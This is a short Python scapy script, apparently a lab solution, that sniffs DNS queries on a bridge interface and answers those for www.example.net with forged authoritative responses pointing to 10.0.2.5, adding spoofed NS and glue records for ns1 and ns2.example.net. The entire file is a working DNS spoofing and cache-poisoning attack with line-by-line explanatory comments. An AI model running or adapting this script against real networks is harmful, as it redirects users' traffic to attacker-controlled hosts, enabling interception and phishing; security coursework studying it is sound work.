#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname.decode('utf-8')):    # check if there is a packet and the name is www.example.net.

    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)                                 # Create the IP packet by swapping the provided Src IP with the Dest IP.

    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)                                 # Create the UDP Packet portion by swapping the Src Port with the Dest Port.

    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.0.2.5')                                   # Making the DNS Record for the respondence for this packet. This is where the packet gets its exact answer for the query for www.example.net.

    # The Authority Section
    NSsec1 = DNSRR(rrname='example.net', type='NS',
                   ttl=259200, rdata='ns1.example.net')                          # Making the Authority record for the packet using example.net and setting the name server as ns1.example.net.
    NSsec2 = DNSRR(rrname='example.net', type='NS',
                   ttl=259200, rdata='ns2.example.net')                          # Making another Authority record for the packet using example.net and setting the name server as ns2.example.net.

    # The Additional Section
    Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
                    ttl=259200, rdata='1.2.3.4')                                 # In the additional section we are setting the name for the name server as ns1.example.net and giving it the ip of 1.2.3.4.
    Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
                    ttl=259200, rdata='5.6.7.8')                                 # same as above but for ns2.example.net and assigning the ip as 5.6.7.8.

    # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                 qdcount=1, ancount=1, nscount=2, arcount=2,
                 an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)                # Creating the DNS payload with the information above by filling in the respected parts into their slots.

    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt                                               # Combine the different parts of the packet above into a single packet.
    send(spoofpkt)                                                               # Send spoofpkt as a completed packet.

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53'
pkt = sniff(iface='br-1c52f7acde30', filter=f, prn=spoof_dns)
